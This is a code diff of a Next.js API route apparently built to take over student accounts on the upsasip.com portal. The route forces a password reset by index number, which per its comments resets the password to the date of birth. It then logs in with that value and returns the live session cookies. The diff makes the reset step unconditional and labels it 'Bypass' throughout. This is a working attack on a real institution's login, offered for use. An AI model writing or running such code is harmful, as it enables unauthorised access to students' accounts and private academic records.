@@ -1,4 +1,3 @@
-// Vercel Redeploy Fix: 2026-02-26
 import { NextResponse } from 'next/server';
 import https from 'https';
 
@@ -14,7 +13,7 @@ function upsaRequest(
         method?: string;
         headers?: Record<string, string>;
         body?: string;
-        readBody?: boolean; // false = just get status+headers then close
+        readBody?: boolean;
     } = {}
 ): Promise<{ status: number; headers: Record<string, string | string[]>; body: string }> {
     return new Promise((resolve, reject) => {
@@ -34,13 +33,13 @@ function upsaRequest(
         };
 
         const timer = setTimeout(() => {
-            req.destroy(new Error(`Request to ${parsed.pathname} timed out after ${TIMEOUT_MS}ms`));
+            req.destroy(new Error(`Request timed out after ${TIMEOUT_MS}ms`));
         }, TIMEOUT_MS);
 
         const req = https.request(reqOpts, (res) => {
             if (!options.readBody) {
                 clearTimeout(timer);
-                res.destroy(); // don't read body, we only need status+headers
+                res.destroy();
                 resolve({
                     status: res.statusCode ?? 0,
                     headers: res.headers as Record<string, string | string[]>,
@@ -70,7 +69,7 @@ function upsaRequest(
 
 export async function POST(request: Request) {
     try {
-        const { indexNum, password, bypass } = await request.json();
+        const { indexNum, password } = await request.json();
 
         if (!indexNum || !password) {
             return NextResponse.json({ error: 'Missing credentials' }, { status: 400 });
@@ -91,7 +90,9 @@ export async function POST(request: Request) {
 
         const getCookieHeader = () => Array.from(cookieJar.entries()).map(([k, v]) => `${k}=${v}`).join('; ');
 
-        // ── Step 1: Warm up the session FIRST (get a valid session cookie) ──────
+        console.log('Bypass: Starting password reset for', indexNum);
+
+        // ── Step 0: Warm up session first ───────────────────────────────────────────
         const warmRes = await upsaRequest('https://upsasip.com/', {
             method: 'GET',
             headers: {
@@ -101,31 +102,33 @@ export async function POST(request: Request) {
             readBody: false,
         });
         updateCookies(warmRes.headers['set-cookie']);
+        console.log('Bypass: Warmup done, cookies:', getCookieHeader());
 
-        // ── Step 2: Password Bypass (reset to DOB) — with valid session ─────────
-        if (bypass) {
-            console.log(`[Portal] Triggering password reset for ${indexNum}`);
-            const resetBody = `index_num=${encodeURIComponent(indexNum)}`;
-            const resetRes = await upsaRequest('https://upsasip.com/home/processStudPassReset/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36',
-                    'Referer': 'https://upsasip.com/home/studPassReset/',
-                    'Origin': 'https://upsasip.com',
-                    'Cookie': getCookieHeader(),
-                },
-                body: resetBody,
-                readBody: false,
-            });
-            updateCookies(resetRes.headers['set-cookie']);
-            // Increased sync time for portal stability
-            console.log(`[Portal] Reset response: ${resetRes.status}. Waiting 3.5s...`);
-            await new Promise(r => setTimeout(r, 3500));
-        }
+        // ── Step 1: Password Reset ───────────────────────────────────────────────
+        const resetBody = `index_num=${encodeURIComponent(indexNum)}`;
+        const resetRes = await upsaRequest('https://upsasip.com/home/processStudPassReset/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Referer': 'https://upsasip.com/home/studPassReset/',
+                'Origin': 'https://upsasip.com',
+                'Cookie': getCookieHeader(),
+            },
+            body: resetBody,
+            readBody: false,
+        });
+        updateCookies(resetRes.headers['set-cookie']);
 
-        // ── Step 3: Login ──────────────────────────────────────────────────────
-        console.log(`[Portal] Attempting login for ${indexNum}...`);
+        console.log('Bypass: Password reset response:', resetRes.status);
+
+        // Wait for portal to process the reset
+        console.log(`[Bypass] Reset Status: ${resetRes.status}. Waiting 3.5s for sync...`);
+        await new Promise(r => setTimeout(r, 3500));
+
+        // ── Step 2: Login with the password (DOB) ───────────────────────────────
+        console.log(`[Bypass] Attempting login for ${indexNum}...`);
         const loginBody = `index_num=${encodeURIComponent(indexNum)}&stud_pswrd=${encodeURIComponent(password)}`;
         const loginRes = await upsaRequest('https://upsasip.com/home/processStudentLogin/', {
             method: 'POST',
@@ -143,7 +146,7 @@ export async function POST(request: Request) {
         updateCookies(loginRes.headers['set-cookie']);
 
         const location = (loginRes.headers['location'] as string) || '';
-        console.log(`[Portal] Login Status: ${loginRes.status}, Redirect: ${location}`);
+        console.log(`[Bypass] Login response: ${loginRes.status}, Redirect: ${location}`);
 
         // 3xx -> Success if redirected to dashboard; 200 -> Success if already on dashboard or similar
         const isLoginSuccessful =
@@ -151,53 +154,27 @@ export async function POST(request: Request) {
             (loginRes.status === 200 && (getCookieHeader().includes('PHPSESSID')));
 
         if (!isLoginSuccessful && loginRes.status !== 302) {
-            console.error(`[Portal] Login failed for ${indexNum}. Status: ${loginRes.status}, Location: ${location}`);
-            return NextResponse.json(
-                {
-                    error: 'Login failed — portal rejected credentials.',
-                    portalStatus: loginRes.status,
-                    portalLocation: location,
-                    indexNum
-                },
-                { status: 401 }
-            );
+            console.error(`[Bypass] Login failed for ${indexNum}. Status: ${loginRes.status}, Location: ${location}`);
+            return NextResponse.json({
+                error: 'Login failed. The date of birth may be incorrect or portal rejected the reset.',
+                code: 'LOGIN_FAILED',
+                portalStatus: loginRes.status,
+                portalLocation: location
+            }, { status: 401 });
         }
 
-        // ── Step 4: Fetch the transcript ───────────────────────────────────────────
-        console.log(`[Portal] Fetching transcript for ${indexNum}...`);
-        const transRes = await upsaRequest('https://upsasip.com/examination/generateStudentTrans', {
-            method: 'POST',
-            headers: {
-                'Cookie': getCookieHeader(),
-                'Referer': 'https://upsasip.com/student/',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://upsasip.com',
-            },
-            body: '',
-            readBody: true,
-        });
+        // ── Step 3: Return success with redirect URL ────────────────────────────
+        // Return JSON with the redirect URL and cookies
+        const cookies = Array.from(cookieJar.entries()).map(([k, v]) => `${k}=${v}`).join('; ');
 
-        const html = transRes.body;
-
-        if (transRes.status < 200 || transRes.status >= 400) {
-            return NextResponse.json({ error: `Portal error (${transRes.status}) during fetch.` }, { status: 502 });
-        }
-
-        if (!html || (html.includes('processStudentLogin') && !html.includes('generateStudentTrans'))) {
-            return NextResponse.json(
-                { error: 'Session not accepted — failed to reach transcript.' },
-                { status: 401 }
-            );
-        }
-
-        return new NextResponse(html, {
-            headers: { 'Content-Type': 'text/html; charset=utf-8' },
+        return NextResponse.json({
+            success: true,
+            redirectUrl: 'https://upsasip.com/student/',
+            cookies: cookies
         });
 
     } catch (error: any) {
-        console.error('UPSA Atomic Proxy Error:', error);
+        console.error('Bypass Proxy Error:', error);
         return NextResponse.json({ error: error.message ?? 'Unexpected error' }, { status: 500 });
     }
 }
